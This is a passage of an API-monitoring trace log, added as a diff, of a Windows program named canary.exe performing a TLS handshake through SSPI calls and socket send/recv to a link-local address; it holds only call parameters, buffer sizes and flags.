+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641957A48
+[PAR] PSecBufferDesc pOutput       : 0x00000026419579A0
+[PAR] unsigned long* pfContextAttr : 0x0000002641955740
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2DBF0
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x00000026419579F0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x63
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x000000263FE22100
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [53]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <GetModuleHandleW> in [KERNEL32.dll] 
+[PAR] LPCWSTR lpModuleName : 0x0000002641957C34 ("kernel32.dll")
+[RET] 0x7ffa2bbffec5 in [System.ni.dll]
+
+[CNT] [54]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <GetProcAddress> in [KERNEL32.dll] 
+[PAR] HMODULE hModule    : 0x00007FFA3FB50000 ("KERNEL32.dll")
+[PAR] LPCSTR  lpProcName : 0x000000263FD2DC60 ("GetCurrentPackageId")
+[RET] 0x7ffa2bbff8a3 in [System.ni.dll]
+
+[CNT] [55]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <GetCurrentPackageId> in [KERNELBASE.dll] 
+[PAR] UINT32* bufferLength : 0x000000263FD2DDA0
+[PAR] BYTE*   buffer       : 0x0
+[RET] 0x7ffa2bbff9be in [System.ni.dll]
+
+[CNT] [56]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x3d0
+[PAR] char   *buf : 0x0000002641957A70
+[PAR] int    len  : 0x63
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [57]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641957A70
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [58]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641957A75
+[PAR] int    len    : 0x3d
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [59]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2DAC8
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2DB80
+[PAR] WCHAR*         pszTargetName : 0x0000002641938D6C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0000002641958190
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x00000026419581D8
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x42
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000002641957A70
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641957A48
+[PAR] PSecBufferDesc pOutput       : 0x00000026419581B0
+[PAR] unsigned long* pfContextAttr : 0x0000002641955740
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2DAC0
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x0000002641958238
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [60]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x00000026419582A0
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [61]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x00000026419582C5
+[PAR] int    len    : 0x363
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [62]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2D998
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2DA50
+[PAR] WCHAR*         pszTargetName : 0x0000002641938D6C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x00000026419586F8
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x0000002641958740
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x368
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x00000026419582C0
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641957A48
+[PAR] PSecBufferDesc pOutput       : 0x0000002641958718
+[PAR] unsigned long* pfContextAttr : 0x0000002641955740
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2D990
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x00000026419587A0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [63]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641958808
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [64]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264195882D
+[PAR] int    len    : 0x14b
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [65]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2D868
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2D920
+[PAR] WCHAR*         pszTargetName : 0x0000002641938D6C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0000002641958A48
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x0000002641958A90
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x150
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000002641958828
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641957A48
+[PAR] PSecBufferDesc pOutput       : 0x0000002641958A68
+[PAR] unsigned long* pfContextAttr : 0x0000002641955740
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2D860
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x0000002641958AF0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [66]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641958B58
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [67]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641958B7D
+[PAR] int    len    : 0x4
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [68]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2D738
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2D7F0
+[PAR] WCHAR*         pszTargetName : 0x0000002641938D6C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0000002641958C58
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x0000002641958CA0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x9
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000002641958B78
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641957A48
+[PAR] PSecBufferDesc pOutput       : 0x0000002641958C78
+[PAR] unsigned long* pfContextAttr : 0x0000002641955740
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2D730
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x0000002641958D00
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x86
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x000000263FE2D500
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [69]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x3d0
+[PAR] char   *buf : 0x0000002641958D48
+[PAR] int    len  : 0x86
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [70]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641958D48
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [71]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641958E0D
+[PAR] int    len    : 0xca
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [72]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2D608
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2D6C0
+[PAR] WCHAR*         pszTargetName : 0x0000002641938D6C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0000002641958FA8
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x0000002641958FF0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0xcf
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000002641958E08
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641957A48
+[PAR] PSecBufferDesc pOutput       : 0x0000002641958FC8
+[PAR] unsigned long* pfContextAttr : 0x0000002641955740
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2D600
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x0000002641959050
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [73]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x00000026419590B8
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [74]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x00000026419590DD
+[PAR] int    len    : 0x1
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [75]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2D4D8
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2D590
+[PAR] WCHAR*         pszTargetName : 0x0000002641938D6C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x00000026419591B0
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x00000026419591F8
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x6
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x00000026419590D8
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641957A48
+[PAR] PSecBufferDesc pOutput       : 0x00000026419591D0
+[PAR] unsigned long* pfContextAttr : 0x0000002641955740
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2D4D0
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x0000002641959258
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [76]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x00000026419592C0
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [77]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x00000026419592E5
+[PAR] int    len    : 0x30
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [78]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2D3A8
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2D460
+[PAR] WCHAR*         pszTargetName : 0x0000002641938D6C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x00000026419593E8
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x0000002641959430
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x35
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x00000026419592E0
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641957A48
+[PAR] PSecBufferDesc pOutput       : 0x0000002641959408
+[PAR] unsigned long* pfContextAttr : 0x0000002641955740
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2D3A0
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x0000002641959490
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[CNT] [79]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryContextAttributesW> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext     : 0x0000002641957A48
+[PAR] unsigned long  ulAttribute   : 0x4 (ISC_RET_REPLAY_DETECT)
+[PAR] void           *pBuffer      : 0x0000002641959530
+[RET] 0x7ffa2bc06c20 in [System.ni.dll]
+
+[CNT] [80]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryContextAttributesW> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext     : 0x0000002641957A48
+[PAR] unsigned long  ulAttribute   : 0x5a (ISC_RET_MUTUAL_AUTH | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_USED_COLLECTED_CREDS)
+[PAR] void           *pBuffer      : 0x00000026419595C0
+[RET] 0x7ffa2bc06c20 in [System.ni.dll]
+
+[CNT] [81]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryContextAttributesW> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext     : 0x0000002641957A48
